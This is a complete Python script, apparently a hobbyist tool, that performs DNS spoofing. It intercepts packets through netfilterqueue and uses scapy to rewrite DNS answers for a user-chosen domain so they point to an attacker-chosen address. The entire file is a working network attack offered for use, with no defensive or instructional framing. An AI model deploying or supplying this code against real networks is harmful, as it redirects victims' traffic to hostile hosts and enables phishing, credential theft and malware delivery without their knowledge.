#!/usr/bin/env python
import netfilterqueue 
import scapy.all as nitro
import pyfiglet

result = pyfiglet.figlet_format('404_is', font='banner3-D')
print(result)

print("A dns spoofer designed by obadare victor")

sitetospoof_value = raw_input("404 would need you to enter the site you want to spoof>>")


redirectionsite_value = raw_input("404 would need you to enter the site you want to redirect to>>") 

def process_packet(packet):
    scapy_packet = nitro.IP(packet.get_payload())

    if scapy_packet.haslayer(nitro.DNSRR):
        qname = scapy_packet[nitro.DNSQR].qname
        if sitetospoof_value in qname:
            print("[+] 404 is spoofing target")
            answer = nitro.DNSRR(rrname=qname, rdata=redirectionsite_value)
            scapy_packet[nitro.DNS].an = answer
            scapy_packet[nitro.DNS].ancount = 1

            del scapy_packet[nitro.IP].chksum 
            del scapy_packet[nitro.IP].len
            del scapy_packet[nitro.UDP].chksum 
            del scapy_packet[nitro.UDP].len 

            packet.set_payload(str(scapy_packet))
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()


